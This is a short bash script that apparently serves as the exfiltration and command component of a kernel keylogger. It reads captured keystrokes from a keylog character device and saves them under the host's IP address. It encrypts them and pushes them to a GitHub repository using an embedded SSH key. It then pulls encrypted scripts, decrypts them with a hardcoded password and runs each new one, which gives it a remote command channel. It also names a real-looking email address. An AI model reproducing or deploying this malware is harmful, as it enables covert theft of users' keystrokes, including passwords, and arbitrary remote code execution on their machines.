#!/bin/bash

major=`cat /sys/kernel/debug/keylog/major`

cd /etc/keylog
git pull

mkdir -p logs
mkdir -p scripts

ip=`ip route get 8.8.8.8 | grep -oP 'src \K[^ ]+'`
mknod chrdev0 c $major 0
cat chrdev0 > "./logs/$ip.txt"
rm chrdev0

# encrypt
openssl rsautl -encrypt -inkey key_public.pem -pubin -in "logs/$ip.txt" -out "logs/$ip.enc"



git config user.email "spencer.stevens@verizon.net"
git config user.name "dummy000000"

echo "Host github.com
    IdentityFile /etc/keylog/git_id_rsa" > "~/.ssh/config"

# add
git add .

# commit
git commit -m "update"

# push
git push

# extract all encrypted scripts
for file in ./scripts/*.enc
do 
    if ! test -f "${file%.*}.sh"; then
        echo "${file%.*}.sh does not exist"
        openssl rsautl -decrypt -inkey "scripts.pem" -in "$file" -passin "pass:scripts" > "${file%.*}.sh"
    fi
done

# # run all scripts not in ./run.txt
input="./run.txt"
echo "" >> "$input"
for file in ./scripts/*.sh
do
        if ! grep -q "$file" "$input"; then
                bash "$file"
                echo "$file" >> "$input" 
        fi
done